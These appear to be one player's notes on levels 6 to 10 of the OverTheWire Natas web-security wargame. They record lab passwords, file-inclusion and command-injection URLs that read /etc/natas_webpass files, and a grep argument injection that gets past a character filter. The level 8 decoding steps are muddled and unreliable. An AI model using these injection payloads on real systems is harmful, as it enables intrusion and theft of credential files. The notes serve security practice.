Level 6: 
- There is a link to a source code which has "include "includes/secret.inc";"
- When open the link look at the Response raw in the inspector. This contains a password " Â´FOEIUWGHFEEUHOFUOIU"

- pw: "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS"

Level 7: 
- In the HTML of the website is the hint: <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
- Replace the argument in the index.php with the path -->  http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
- pw: "xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q "

Level 8: 
- The HTML shows a link for the source code of the encryption this contains: 
        $encodedSecret = "3d3d516343746d4d6d6c315669563362";
        
        function encodeSecret($secret) {
            return bin2hex(strrev(base64_encode($secret)));
        }
- So take the secret binary to hexadezimal -> string reversed --> base64_encode --> oubWYf2kBq
- pw: "ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t"

Level 9: 
- Works with URL-Injection, in the starting Page of the nantes it says "All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5."
- So I can access this file with http://natas9.natas.labs.overthewire.org/?needle=;%20cat%20/etc/natas_webpass/natas10
- pw: "t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu"

Level 10: 
- Is the same problem as in lvl 9 but has a character check -->  if(preg_match('/[;|&]/',$key)) --> / is begin and end in php of regex,  [] is a array of the character --> banned are ; & |
- Abuse the grep command --> ?needle= -E .%20 /../../etc/natas_webpass/natas11&submit=Search --> -E is the start of regex in grep and "." is any character
